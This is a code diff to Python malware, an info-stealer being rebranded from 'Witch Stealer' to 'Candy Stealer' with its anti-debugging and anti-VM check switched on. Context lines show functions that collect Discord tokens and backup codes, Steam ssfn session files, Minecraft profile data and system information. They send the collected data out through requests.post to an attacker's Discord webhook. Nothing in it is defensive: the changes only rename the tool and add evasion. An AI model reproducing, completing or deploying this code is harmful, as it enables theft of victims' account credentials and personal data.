@@ -31,7 +31,7 @@ __CONFIG__ = {
     "startup": False,
     "minecraft": False,
     "Steam": False,
-    "Anti_Debugs_VM": False,
+    "Anti_Debugs_VM": True,
     "backupcode": False,
     "ERROR": False
 }
@@ -268,7 +268,7 @@ def tokens(token: str):
             pass
 
         embed = {
-            "username": "Witch Stealer",
+            "username": "Candy Stealer",
             "avatar_url": __CONFIG__["avatar_link"],
             "embeds": [{
                 "title": f"<:user:1380756103045976216> {user_name} ({user_id})",
@@ -362,7 +362,7 @@ def minecraft_profile():
                 usercache = temp.read()
 
     data = {
-        "username": "Witch Stealer",
+        "username": "Candy Stealer",
         "avatar_url": __CONFIG__["avatar_link"],
         "embeds": [
             {
@@ -419,7 +419,7 @@ def steam():
                     zp.write(ssfn_file, os.path.basename(ssfn_file))
 
         embed = {
-        "username": "Witch Stealer", 
+        "username": "Candy Stealer", 
         "avatar_url": __CONFIG__["avatar_link"],  
             "embeds": [
                 {
@@ -437,7 +437,7 @@ def steam():
         with open(zip_path, 'rb') as f:
             files = {'file': ('steam.zip', f)}
             users = {
-                "username": "Witch Stealer"
+                "username": "Candy Stealer"
             }
             requests.post(__CONFIG__["webhook"], data=users, files=files)
 
@@ -508,7 +508,7 @@ def systeminformation():
         ]
 
     embed = {
-        "username": "Witch Stealer",
+        "username": "Candy Stealer",
         "avatar_url": __CONFIG__["avatar_link"],
         "embeds": [{
             "title": "SYSTEM INFORMATION",
@@ -656,7 +656,7 @@ def discord_backup_code_steal():
 
     with open(temp_file, 'rb') as f:
         files = {'file': ('discord_backup_codes.txt', f)}
-        requests.post(__CONFIG__["webhook"], json={"username": "Witch Stealer", "avatar_url": __CONFIG__['avatar_link']}, files=files)
+        requests.post(__CONFIG__["webhook"], json={"username": "Candy Stealer", "avatar_url": __CONFIG__['avatar_link']}, files=files)
 
 
 def startup():
